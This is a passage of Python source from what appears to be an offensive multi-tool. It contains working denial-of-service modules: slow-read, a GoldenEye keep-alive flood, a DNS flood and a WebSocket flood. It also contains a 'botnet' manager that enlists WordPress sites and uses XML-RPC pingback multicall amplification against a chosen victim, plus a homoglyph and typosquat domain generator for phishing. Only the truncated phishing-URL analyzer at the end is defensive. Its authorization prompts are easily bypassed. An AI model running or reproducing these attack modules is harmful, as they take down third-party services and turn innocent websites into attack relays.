                    data = s.recv(read_rate)
                    if not data:
                        break
                    counter[0] += len(data)
                    time.sleep(1)

                active[0] -= 1
                s.close()
            except Exception:
                active[0] = max(0, active[0] - 1)

    stats_thread = threading.Thread(target=_stress_stats, args=("SLOW READ", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(conns):
        t = threading.Thread(target=slow_reader)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Bytes Read", str(counter[0]))
    print_row("Connections Used", str(conns))
    print_row("Duration", f"{elapsed:.1f}s")


# ─── 48. GoldenEye (HTTP Keep-Alive DoS) ─────────────────────────────────────

def goldeneye():
    print_header("GoldenEye (HTTP Keep-Alive Flood)")
    if not stress_disclaimer():
        return

    url = prompt("Target URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    workers_n = input(f"  {Y}Workers (1-200) [50]:{RST} ").strip() or "50"
    sockets_per = input(f"  {Y}Sockets per worker (1-50) [10]:{RST} ").strip() or "10"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        workers_n = min(200, max(1, int(workers_n)))
        sockets_per = min(50, max(1, int(sockets_per)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "https"
    port = 443 if use_ssl else 80
    if ":" in host:
        host, port_s = host.rsplit(":", 1)
        port = int(port_s)

    print_row("Target", url)
    print_row("Workers", str(workers_n))
    print_row("Sockets/Worker", str(sockets_per))
    print_row("Total Sockets", str(workers_n * sockets_per))
    print_row("Duration", f"{duration}s")
    print_warn("Uses Keep-Alive connections with randomized headers")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148",
    ]

    referers = [
        "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
        "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
    ]

    def goldeneye_worker():
        sockets = []
        while not stop_event.is_set():
            # Fill up sockets
            while len(sockets) < sockets_per and not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    if use_ssl:
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.connect((host, port))
                    sockets.append(s)
                except Exception:
                    break

            # Send randomized requests on keep-alive connections
            for s in list(sockets):
                try:
                    rand_path = path + ("&" if "?" in path else "?") + \
                        f"{''.join(random.choices(string.ascii_lowercase, k=6))}={random.randint(1,99999)}"
                    request = (
                        f"GET {rand_path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Accept: text/html,application/xhtml+xml,*/*;q=0.{random.randint(1,9)}\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                        f"Referer: {random.choice(referers)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Keep-Alive: timeout={random.randint(30,120)}\r\n\r\n"
                    )
                    s.send(request.encode())
                    counter[0] += 1
                except Exception:
                    sockets.remove(s)
                    try:
                        s.close()
                    except Exception:
                        pass

            time.sleep(random.uniform(0.05, 0.2))

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    stats_thread = threading.Thread(target=_stress_stats, args=("GOLDENEYE", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(workers_n):
        t = threading.Thread(target=goldeneye_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1.5)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Requests", str(counter[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} req/s" if elapsed > 0 else "N/A")


# ─── 71. DNS Flood ───────────────────────────────────────────────────────────

def dns_flood():
    print_header("DNS Flood")
    if not _stealth_raw_socket_warning("DNS Flood"):
        return
    if not stress_disclaimer():
        return

    target = prompt("Target DNS server IP")
    if not target:
        return
    domain = input(f"  {Y}Domain to query [{W}example.com{Y}]:{RST} ").strip() or "example.com"
    threads_n = input(f"  {Y}Threads [50]:{RST} ").strip()
    threads_n = min(200, max(1, int(threads_n))) if threads_n.isdigit() else 50
    duration = input(f"  {Y}Duration seconds [30]:{RST} ").strip()
    duration = min(300, max(1, int(duration))) if duration.isdigit() else 30

    print(f"\n  {Y}Flooding {target} with DNS queries for {duration}s ({threads_n} threads)...{RST}")
    print(f"  {W}Press Ctrl+C to stop{RST}\n")

    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    def build_dns_query(domain_name):
        tid = random.randint(0, 65535)
        flags = 0x0100  # standard query, recursion desired
        header = struct.pack(">HHHHHH", tid, flags, 1, 0, 0, 0)
        question = b""
        for part in domain_name.split("."):
            question += bytes([len(part)]) + part.encode()
        question += b"\x00"
        question += struct.pack(">HH", 1, 1)  # A record, IN class
        return header + question

    def worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        while not stop_event.is_set():
            try:
                rand_sub = ''.join(random.choices(string.ascii_lowercase, k=8))
                query = build_dns_query(f"{rand_sub}.{domain}")
                s.sendto(query, (target, 53))
                counter[0] += 1
            except Exception:
                pass
        s.close()

    stats_thread = threading.Thread(target=_stress_stats, args=("DNS", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads_n):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1.5)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Queries", str(counter[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} qps" if elapsed > 0 else "N/A")


# ─── 72. WebSocket Flood ─────────────────────────────────────────────────────

def websocket_flood():
    print_header("WebSocket Flood")
    if not stress_disclaimer():
        return

    target = prompt("Target WebSocket URL (ws:// or wss://)")
    if not target:
        return

    if not target.startswith(("ws://", "wss://")):
        if target.startswith("https://"):
            target = "wss://" + target[8:]
        elif target.startswith("http://"):
            target = "ws://" + target[7:]
        else:
            target = "ws://" + target

    threads_n = input(f"  {Y}Connections [50]:{RST} ").strip()
    threads_n = min(200, max(1, int(threads_n))) if threads_n.isdigit() else 50
    duration = input(f"  {Y}Duration seconds [30]:{RST} ").strip()
    duration = min(300, max(1, int(duration))) if duration.isdigit() else 30
    msg_size = input(f"  {Y}Message size bytes [1024]:{RST} ").strip()
    msg_size = min(65536, max(1, int(msg_size))) if msg_size.isdigit() else 1024

    print(f"\n  {Y}Flooding {target} for {duration}s ({threads_n} connections)...{RST}")
    print(f"  {W}Press Ctrl+C to stop{RST}\n")

    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "wss" else 80)
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "wss"

    # Pre-resolve hostname to IP so workers don't trigger DNS leak block
    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            resolved_ip = str(answers[0])
        else:
            resolved_ip = socket.gethostbyname(host)
    except Exception:
        print_err("Could not resolve hostname")
        return

    def ws_worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if use_ssl:
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.connect((resolved_ip, port))

                # WebSocket handshake
                key = ''.join(random.choices(string.ascii_letters, k=16))
                import base64 as _b64
                ws_key = _b64.b64encode(key.encode()).decode()
                handshake = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {ws_key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n\r\n"
                )
                s.send(handshake.encode())
                s.recv(1024)

                # Send frames
                while not stop_event.is_set():
                    payload = random.randbytes(msg_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(msg_size))
                    # Build WebSocket text frame
                    frame = bytearray()
                    frame.append(0x81)  # FIN + text opcode
                    mask_key = bytes([random.randint(0, 255) for _ in range(4)])
                    if msg_size <= 125:
                        frame.append(0x80 | msg_size)
                    elif msg_size <= 65535:
                        frame.append(0x80 | 126)
                        frame.extend(struct.pack(">H", msg_size))
                    else:
                        frame.append(0x80 | 127)
                        frame.extend(struct.pack(">Q", msg_size))
                    frame.extend(mask_key)
                    masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
                    frame.extend(masked)
                    s.send(frame)
                    counter[0] += 1

            except Exception:
                pass
            finally:
                try:
                    s.close()
                except Exception:
                    pass

    stats_thread = threading.Thread(target=_stress_stats, args=("WS-FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads_n):
        t = threading.Thread(target=ws_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1.5)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Messages", str(counter[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} msg/s" if elapsed > 0 else "N/A")
    print_row("Data Sent", f"{counter[0] * msg_size / 1024 / 1024:.1f} MB")


# ─── Botnet — Coordinated DDoS from Discovered Targets ──────────────────────

def botnet_manager():
    print_header("Botnet — Coordinated DDoS via Zombie Relays")
    if not stress_disclaimer():
        return

    zombies = _botnet_db_load()

    while True:
        print(f"\n  {Y}── Botnet Zombie Manager ──{RST}")
        print(f"  {C}Zombies in DB:{RST} {W}{len(zombies)}{RST}\n")

        if zombies:
            for i, z in enumerate(zombies, 1):
                vecs = ", ".join(z.get("vectors", []))
                added = z.get("added", "?")[:10]
                print(f"  {C}{i:>3}.{RST} {W}{z['url']}{RST}  [{z.get('cms', '?')}]  "
                      f"vectors: {R}{vecs}{RST}  added: {added}")
            print()

        ping_zombies = [z for z in zombies if "pingback.ping" in z.get("vectors", [])]

        print(f"  {Y}Options:{RST}")
        print(f"    {R}1.{RST} XML-RPC Pingback Amplification ({G}{len(ping_zombies)}{RST} relays available)")
        print(f"    {C}2.{RST} Add zombie manually")
        print(f"    {C}3.{RST} Remove zombie")
        print(f"    {C}4.{RST} Clear all zombies")
        print(f"    {C}0.{RST} Back to main menu")

        choice = input(f"\n  {Y}Select >{RST} ").strip()

        if choice == "0":
            return
        elif choice == "1":
            if not ping_zombies:
                print_err("No zombies with pingback.ping vector. Run CMS Vuln Scanner (50) first.")
                continue
            _botnet_xmlrpc_amplify(ping_zombies)
        elif choice == "2":
            new_url = prompt("Zombie URL")
            if not new_url:
                continue
            if not new_url.startswith(("http://", "https://")):
                new_url = "https://" + new_url
            new_url = new_url.rstrip("/")
            # Verify BOTH vectors before adding to DB
            xmlrpc_url = new_url.rstrip("/") + "/xmlrpc.php"
            print(f"  {Y}[~]{RST} Probing {xmlrpc_url} ...")
            try:
                sess = requests.Session()
                sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
                sess.verify = False
                list_resp = sess.post(xmlrpc_url, timeout=10,
                    data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                    headers={"Content-Type": "text/xml"})
                if list_resp.status_code != 200 or "methodResponse" not in list_resp.text:
                    print(f"  {R}[!]{RST} XML-RPC not active or unreachable — zombie NOT added.")
                    continue
                methods = re.findall(r"<string>(.*?)</string>", list_resp.text)
                has_pingback = "pingback.ping" in methods
                has_multicall = "system.multicall" in methods
                if not has_pingback:
                    print(f"  {R}[!]{RST} pingback.ping NOT available — zombie NOT added.")
                if not has_multicall:
                    print(f"  {R}[!]{RST} system.multicall NOT available — zombie NOT added.")
                if not (has_pingback and has_multicall):
                    continue
                ddos_vecs = []
                if has_pingback:
                    ddos_vecs.append("pingback.ping")
                if has_multicall:
                    ddos_vecs.append("system.multicall")
                _botnet_db_add(new_url, "Manual", ddos_vecs)
                zombies = _botnet_db_load()
                print(f"  {G}[+]{RST} Both vectors confirmed — zombie added to DB.")
            except Exception as e:
                print(f"  {R}[!]{RST} Probe failed: {e} — zombie NOT added.")
        elif choice == "3":
            idx = input(f"  {Y}Zombie number to remove:{RST} ").strip()
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(zombies):
                    removed = zombies.pop(idx)
                    _botnet_db_save(zombies)
                    print(f"  {G}[+]{RST} Removed: {removed['url']}")
                else:
                    print_err("Invalid number.")
            except ValueError:
                print_err("Enter a valid number.")
        elif choice == "4":
            confirm = input(f"  {R}Clear ALL zombies? (yes/no):{RST} ").strip().lower()
            if confirm in ("yes", "y"):
                zombies = []
                _botnet_db_save(zombies)
                print(f"  {G}[+]{RST} All zombies cleared.")
        else:
            print_err("Invalid option.")


def _botnet_xmlrpc_amplify(relays):
    """Use WordPress sites with pingback.ping + system.multicall as amplifiers against a victim URL."""
    print(f"\n  {R}{'═' * 60}{RST}")
    print(f"  {R}  XML-RPC MULTICALL PINGBACK AMPLIFICATION{RST}")
    print(f"  {R}{'═' * 60}{RST}")
    print(f"  {W}Each relay batches multiple pingback.ping calls inside a{RST}")
    print(f"  {W}single system.multicall request — massive amplification.{RST}")
    print(f"  {C}Available relays:{RST} {G}{len(relays)}{RST}")
    for r in relays:
        vecs = ", ".join(r.get("vectors", []))
        print(f"    {R}►{RST} {r['url']}  [{vecs}]")
    print(f"  {R}{'═' * 60}{RST}")

    victim = prompt("Victim URL (the target to DDoS)")
    if not victim:
        return
    if not victim.startswith(("http://", "https://")):
        victim = "https://" + victim

    threads_per = input(f"  {Y}Threads per relay (1-50) [10]:{RST} ").strip() or "10"
    batch_size = input(f"  {Y}Pings per multicall batch (1-500) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        threads_per = min(50, max(1, int(threads_per)))
        batch_size = min(500, max(1, int(batch_size)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    print(f"\n  {R}  VICTIM:   {W}{victim}{RST}")
    print(f"  {R}  RELAYS:   {W}{len(relays)}{RST}")
    print(f"  {R}  THREADS:  {W}{threads_per}/relay = {threads_per * len(relays)} total{RST}")
    print(f"  {R}  BATCH:    {W}{batch_size} pingbacks per multicall request{RST}")
    print(f"  {R}  DURATION: {W}{duration}s{RST}")
    print(f"  {R}  MULTIPLIER: {W}1 HTTP req = {batch_size} pingbacks to victim{RST}")

    confirm = input(f"\n  {R}Confirm launch? (yes/no):{RST} ").strip().lower()
    if confirm not in ("yes", "y", "si", "s"):
        print_warn("Aborted.")
        return

    stop_event = threading.Event()
    # counters track actual pingbacks (batch_size per successful request)
    counters = {r["url"]: [0] for r in relays}
    http_reqs = {r["url"]: [0] for r in relays}
    errors = [0]
    start_time = time.time()

    def _build_multicall_payload(relay_url, n):
        """Build a system.multicall XML payload with n pingback.ping calls."""
        calls = []
        for _ in range(n):
            post_id = random.randint(1, 9999)
            calls.append(
                '<value><struct>'
                '<member><name>methodName</name><value><string>pingback.ping</string></value></member>'
                '<member><name>params</name><value><array><data>'
                f'<value><string>{victim}</string></value>'
                f'<value><string>{relay_url}/?p={post_id}</string></value>'
                '</data></array></value></member>'
                '</struct></value>'
            )
        return (
            '<?xml version="1.0"?>'
            '<methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>'
            + ''.join(calls)
            + '</data></array></value></param></params></methodCall>'
        )

    def pingback_worker(relay_url, counter, req_counter):
        xmlrpc_url = relay_url.rstrip("/") + "/xmlrpc.php"
        sess = requests.Session()
        while not stop_event.is_set():
            try:
                payload = _build_multicall_payload(relay_url, batch_size)
                resp = sess.post(
                    xmlrpc_url,
                    data=payload,
                    headers={
                        "Content-Type": "text/xml",
                        "User-Agent": f"WordPress/{random.randint(5,6)}.{random.randint(0,9)}",
                    },
                    timeout=15,
                    verify=False,
                )
                if resp.status_code == 200 and "methodResponse" in resp.text:
                    counter[0] += batch_size
                    req_counter[0] += 1
                else:
                    errors[0] += 1
            except Exception:
                errors[0] += 1
            # Small jitter to avoid burst patterns
            time.sleep(random.uniform(0.05, 0.3))

    def stats_printer():
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed > 0:
                parts = []
                total = 0
                total_reqs = 0
                for u, cnt in counters.items():
                    domain = urlparse(u).netloc
                    parts.append(f"{domain}:{cnt[0]}")
                    total += cnt[0]
                    total_reqs += http_reqs[u][0]
                rps = total / elapsed
                sys.stdout.write(
                    f"\r  {Y}[AMPLIFY]{RST} Pingbacks: {G}{total}{RST}  "
                    f"HTTP reqs: {W}{total_reqs}{RST}  "
                    f"Rate: {C}{rps:.0f} pings/s{RST}  "
                    f"Errors: {R}{errors[0]}{RST}  "
                    f"Relays: {' | '.join(parts)}    "
                )
                sys.stdout.flush()
            time.sleep(1)

    st = threading.Thread(target=stats_printer)
    st.daemon = True
    st.start()

    workers = []
    for r in relays:
        for _ in range(threads_per):
            w = threading.Thread(target=pingback_worker,
                                 args=(r["url"], counters[r["url"]], http_reqs[r["url"]]))
            w.daemon = True
            w.start()
            workers.append(w)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    total_pings = sum(c[0] for c in counters.values())
    total_reqs = sum(c[0] for c in http_reqs.values())
    print(f"\n\n  {Y}{'═' * 60}{RST}")
    print(f"  {Y}  MULTICALL AMPLIFICATION RESULTS{RST}")
    print(f"  {Y}{'═' * 60}{RST}")
    print_row("Victim", victim)
    print_row("Batch Size", f"{batch_size} pings/multicall")
    for r in relays:
        cnt = counters[r["url"]][0]
        reqs = http_reqs[r["url"]][0]
        domain = urlparse(r["url"]).netloc
        print(f"  {C}{domain:<35}{RST} {W}{cnt} pingbacks ({reqs} HTTP reqs){RST}")
    print(f"  {Y}{'─' * 60}{RST}")
    print_row("Total Pingbacks", str(total_pings))
    print_row("Total HTTP Reqs", str(total_reqs))
    print_row("Amplification", f"{batch_size}x per request")
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{total_pings / elapsed:.0f} pingbacks/s" if elapsed > 0 else "N/A")
    print(f"\n  {W}Each multicall bundles {G}{batch_size}{RST} {W}pingback.ping calls in 1 HTTP request.{RST}")
    print(f"  {W}Effective amplification: {G}~{total_pings}x{RST} {W}HTTP requests to victim from {total_reqs} actual requests sent.{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#                          PHISHING MODULES
# ═══════════════════════════════════════════════════════════════════════════════

PHISHING_DISCLAIMER = f"""
  {R}╔══════════════════════════════════════════════════════════╗
  ║{RST} {R}▓▓▓  PHISHING SIMULATION — AUTHORIZED USE ONLY  ▓▓▓{RST}     {R}║
  ╠══════════════════════════════════════════════════════════╣
  ║ {Y}These tools are for AUTHORIZED phishing simulations,{R}    ║
  ║ {W}red-team engagements, and security awareness training{R}   ║
  ║ {W}ONLY. You must have WRITTEN AUTHORIZATION from the{R}      ║
  ║ {W}target organization before use.{R}                          ║
  ║                                                          ║
  ║ {Y}Unauthorized phishing is a CRIMINAL OFFENSE.{R}             ║
  ║ {R}YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS.{R}             ║
  ╚══════════════════════════════════════════════════════════╝{RST}
"""


def phishing_disclaimer():
    print(PHISHING_DISCLAIMER)
    c1 = input(f"  {R}Do you have WRITTEN authorization for phishing simulation? (yes/no):{RST} ").strip().lower()
    if c1 not in ("yes", "y", "si", "s"):
        return False
    c2 = input(f"  {R}Type 'I ACCEPT ALL RESPONSIBILITY' to continue:{RST} ").strip()
    if c2.upper() != "I ACCEPT ALL RESPONSIBILITY":
        print_err("Aborted.")
        return False
    return True


# ─── 81. Homoglyph Domain Generator ─────────────────────────────────────────

HOMOGLYPHS = {
    'a': ['а', 'ạ', 'å', 'ä', 'à', 'á', 'ã', '@'],
    'b': ['ḅ', 'Ь', 'ƅ', 'ɓ'],
    'c': ['ç', 'ć', 'ĉ', 'с'],
    'd': ['ḍ', 'ɗ', 'đ'],
    'e': ['е', 'ë', 'é', 'è', 'ê', 'ẹ', 'ė'],
    'g': ['ġ', 'ğ', 'ĝ'],
    'h': ['ḥ', 'ħ', 'н'],
    'i': ['í', 'ì', 'ï', 'î', 'ị', '1', 'l', '|', 'і'],
    'k': ['ḳ', 'к'],
    'l': ['ḷ', '1', 'ĺ', 'ℓ', 'і'],
    'm': ['ṃ', 'м'],
    'n': ['ṇ', 'ñ', 'ń', 'п'],
    'o': ['о', 'ö', 'ó', 'ò', 'ô', 'ọ', '0'],
    'p': ['р', 'ρ'],
    'r': ['ṛ', 'ŕ', 'г'],
    's': ['ṣ', 'ş', 'ś', 'ŝ', '$'],
    't': ['ṭ', 'ţ', 'т'],
    'u': ['ü', 'ú', 'ù', 'û', 'ụ', 'μ'],
    'v': ['ν', 'ṿ'],
    'w': ['ẃ', 'ẁ', 'ẅ', 'ω'],
    'x': ['х', 'ẋ'],
    'y': ['ý', 'ỳ', 'ÿ', 'у'],
    'z': ['ẓ', 'ż', 'ź'],
}


def homoglyph_generator():
    print_header("Homoglyph Domain Generator")
    if not phishing_disclaimer():
        return

    domain = prompt("Target domain (e.g. google.com)")
    if not domain:
        return

    name, _, tld = domain.partition(".")
    if not tld:
        print_err("Enter a full domain with TLD (e.g. example.com)")
        return

    results = []

    # Single-character homoglyph substitutions
    for i, char in enumerate(name):
        if char.lower() in HOMOGLYPHS:
            for glyph in HOMOGLYPHS[char.lower()]:
                fake = name[:i] + glyph + name[i+1:]
                results.append((f"{fake}.{tld}", f"'{char}' → '{glyph}' (pos {i})"))

    # Common typosquatting
    for i in range(len(name) - 1):
        swapped = name[:i] + name[i+1] + name[i] + name[i+2:]
        results.append((f"{swapped}.{tld}", f"swap '{name[i]}' ↔ '{name[i+1]}' (pos {i})"))

    # Missing character
    for i in range(len(name)):
        missing = name[:i] + name[i+1:]
        if missing:
            results.append((f"{missing}.{tld}", f"omit '{name[i]}' (pos {i})"))

    # Double character
    for i in range(len(name)):
        doubled = name[:i] + name[i] + name[i:]
        results.append((f"{doubled}.{tld}", f"double '{name[i]}' (pos {i})"))

    # Adjacent key typos (QWERTY)
    qwerty = {
        'q': 'wa', 'w': 'qes', 'e': 'wrd', 'r': 'etf', 't': 'ryg',
        'y': 'tuh', 'u': 'yij', 'i': 'uok', 'o': 'ipl', 'p': 'ol',
        'a': 'qsz', 's': 'adwx', 'd': 'sfec', 'f': 'dgrc', 'g': 'fhtv',
        'h': 'gjyb', 'j': 'hkun', 'k': 'jlim', 'l': 'kop',
        'z': 'asx', 'x': 'zsd', 'c': 'xdf', 'v': 'cfg', 'b': 'vgh',
        'n': 'bhj', 'm': 'njk',
    }
    for i, char in enumerate(name):
        if char.lower() in qwerty:
            for adj in qwerty[char.lower()][:2]:
                typo = name[:i] + adj + name[i+1:]
                results.append((f"{typo}.{tld}", f"typo '{char}' → '{adj}' (pos {i})"))

    # Alternative TLDs
    alt_tlds = ["com", "net", "org", "co", "io", "info", "xyz", "site",
                "online", "app", "dev", "tech"]
    for alt in alt_tlds:
        if alt != tld:
            results.append((f"{name}.{alt}", f"TLD swap .{tld} → .{alt}"))

    # Deduplicate
    seen = set()
    unique = []
    for dom, desc in results:
        if dom not in seen and dom != domain:
            seen.add(dom)
            unique.append((dom, desc))

    print(f"\n  {Y}Generated {len(unique)} lookalike domains:{RST}\n")
    for dom, desc in unique[:80]:
        print(f"    {R}•{RST} {W}{dom:<35}{RST} {C}{desc}{RST}")
    if len(unique) > 80:
        print(f"\n    {Y}... and {len(unique) - 80} more{RST}")

    # Check which ones are registered
    check = input(f"\n  {Y}Check which domains are registered? (y/n):{RST} ").strip().lower()
    if check in ("y", "yes", "s", "si"):
        spinner("Resolving domains...", 1.0)
        registered = []

        def check_domain(dom):
            try:
                if STEALTH["enabled"] and dns is not None:
                    dns.resolver.resolve(dom, "A", lifetime=10)
                else:
                    socket.gethostbyname(dom)
                return dom
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(check_domain, d): d for d, _ in unique[:80]}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    registered.append(result)
                    print(f"    {R}[REGISTERED]{RST} {W}{result}{RST}")

        if registered:
            print(f"\n  {R}WARNING: {len(registered)} lookalike domain(s) are already registered!{RST}")
        else:
            print(f"\n  {G}No lookalike domains appear to be registered{RST}")


# ─── 82. Phishing URL Analyzer ──────────────────────────────────────────────

def phishing_url_analyzer():
    print_header("Phishing URL Analyzer")
    url = prompt("Suspicious URL")
    if not url:
        return

    spinner("Analyzing URL...", 1.0)

    score = 0
    findings = []

    parsed = urlparse(url if "://" in url else "http://" + url)
    domain = parsed.netloc or parsed.path.split("/")[0]
    path = parsed.path

    # Length checks
    if len(url) > 75:
        score += 10
        findings.append(("Long URL", f"{len(url)} chars (suspicious if > 75)"))
    if len(domain) > 30:
        score += 5
        findings.append(("Long domain", f"{len(domain)} chars"))

    # IP address as domain
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', domain.split(":")[0]):
        score += 25
        findings.append(("IP as domain", "Domains using IPs are highly suspicious"))

    # Suspicious TLDs
    sus_tlds = [".xyz", ".top", ".buzz", ".tk", ".ml", ".ga", ".cf", ".gq",
                ".work", ".click", ".link", ".info", ".racing", ".win"]
    for tld in sus_tlds:
        if domain.endswith(tld):
            score += 10
            findings.append(("Suspicious TLD", tld))

    # Too many subdomains
    subdomain_count = domain.count(".")
    if subdomain_count > 3:
        score += 15
        findings.append(("Excessive subdomains", f"{subdomain_count} levels deep"))

    # @ symbol in URL
    if "@" in url:
        score += 20
        findings.append(("@ symbol in URL", "Can redirect to different host"))

    # Hyphen abuse
    if domain.count("-") > 2:
        score += 10
        findings.append(("Hyphen abuse", f"{domain.count('-')} hyphens in domain"))

    # HTTPS check
    if parsed.scheme == "http":
        score += 10
        findings.append(("No HTTPS", "Legitimate login pages use HTTPS"))

    # Suspicious keywords in URL
    phish_keywords = ["login", "signin", "verify", "secure", "account", "update",
                      "confirm", "banking", "paypal", "apple", "microsoft",
                      "netflix", "amazon", "facebook", "password", "credential",
                      "suspend", "unusual", "locked", "expired"]
    found_kw = [kw for kw in phish_keywords if kw in url.lower()]
    if found_kw:
        score += len(found_kw) * 5
        findings.append(("Phishing keywords", ", ".join(found_kw)))

    # URL shortener
    shorteners = ["bit.ly", "goo.gl", "t.co", "tinyurl", "is.gd", "buff.ly",
                  "ow.ly", "rebrand.ly", "cutt.ly", "short.io"]
    for s in shorteners:
        if s in domain:
            score += 15
            findings.append(("URL shortener", f"Using {s} to hide real destination"))

    # Hex/encoded characters
    if "%" in url and re.search(r'%[0-9a-fA-F]{2}', url):
        encoded_count = len(re.findall(r'%[0-9a-fA-F]{2}', url))
        if encoded_count > 3:
            score += 10
            findings.append(("URL encoding", f"{encoded_count} encoded chars (obfuscation)"))

    # Port in URL
    if re.search(r':\d{2,5}/', url):
        port = re.search(r':(\d{2,5})/', url).group(1)
        if port not in ("80", "443", "8080", "8443"):
            score += 10
            findings.append(("Unusual port", f"Port {port}"))

    # Data URI
    if url.startswith("data:"):
        score += 30
        findings.append(("Data URI", "Page embedded in URL – highly suspicious"))

    # Brand impersonation check
    brands = {"google": "google.com", "facebook": "facebook.com", "apple": "apple.com",
              "microsoft": "microsoft.com", "amazon": "amazon.com", "paypal": "paypal.com",
              "netflix": "netflix.com", "instagram": "instagram.com", "twitter": "twitter.com",
              "linkedin": "linkedin.com", "dropbox": "dropbox.com", "github": "github.com"}
    for brand, legit in brands.items():
        if brand in domain.lower() and legit not in domain.lower():
            score += 20
            findings.append(("Brand impersonation", f"'{brand}' in domain but not {legit}"))

    # Display results
    print(f"\n  {Y}── Analysis ──{RST}")
    print_row("URL", url[:70] + ("..." if len(url) > 70 else ""))
    print_row("Scheme", parsed.scheme or "none")
    print_row("Domain", domain)
    print_row("Path", path or "/")

    if findings:
        print(f"\n  {Y}── Findings ──{RST}")
        for title, detail in findings:
